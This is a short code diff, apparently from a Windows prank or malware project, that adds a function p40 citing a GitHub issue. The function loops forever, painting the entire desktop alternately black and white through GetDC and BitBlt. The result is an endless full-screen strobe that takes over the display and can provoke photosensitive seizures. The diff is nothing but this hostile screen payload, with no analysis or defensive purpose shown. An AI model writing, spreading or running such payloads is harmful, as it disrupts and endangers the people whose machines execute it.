@@ -389,3 +389,15 @@ int p11() {
 
     }
 }
+
+int p40()
+{
+	// https://github.com/kevlu8/Xytharis/issues/6 #1
+	whiletrue
+	{
+		HDC desk=GetDC(NULL);
+		BitBlt(desk,0,0,GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN),desk,0,0,BLACKNESS);
+		BitBlt(desk,0,0,GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN),desk,0,0,WHITENESS);
+		ReleaseDC(NULL,desk);
+	}
+}
